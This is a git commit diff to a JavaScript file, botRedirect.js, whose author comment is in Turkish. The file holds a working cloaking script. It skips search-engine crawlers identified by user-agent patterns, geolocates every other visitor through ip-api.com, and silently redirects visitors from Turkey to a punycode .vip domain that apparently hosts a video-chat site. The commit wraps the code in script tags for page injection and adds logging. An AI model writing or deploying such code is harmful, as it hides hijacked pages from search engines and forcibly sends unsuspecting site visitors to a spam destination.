a8db13df84dec4a856c2d48356797af459a2d0bf
jale211111111111 <ferdiendi22@gmail.com>
2025-06-06 17:16:38 +0300

    Update botRedirect.js

--- botRedirect.js
+++ botRedirect.js
@@ -1,7 +1,7 @@
+<script>
 (function() {
     const botPatterns = [
         /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, 
-        /duckduckbot/i, /yandexbot/i, /baiduspider/i,
         /duckduckbot/i, /baiduspider/i, /yandexbot/i,
         /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i
     ];
@@ -13,11 +13,14 @@
         fetch("http://ip-api.com/json/?fields=countryCode")
             .then(res => res.json())
             .then(data => {
+                console.log("Country code:", data.countryCode); // ✅ BURADA KULLAN
                 if (data.countryCode === "TR") {
                     window.location.href = "https://www.xn--cretsizgoruntulusohbet-rlc.vip/";
                 }
             })
             .catch(err => console.error("IP check failed:", err));
+    } else {
+        console.log("Yönlendirme yapılmadı, muhtemelen bot/masaüstü/başka ülke.");
     }
 })();
-
+</script>
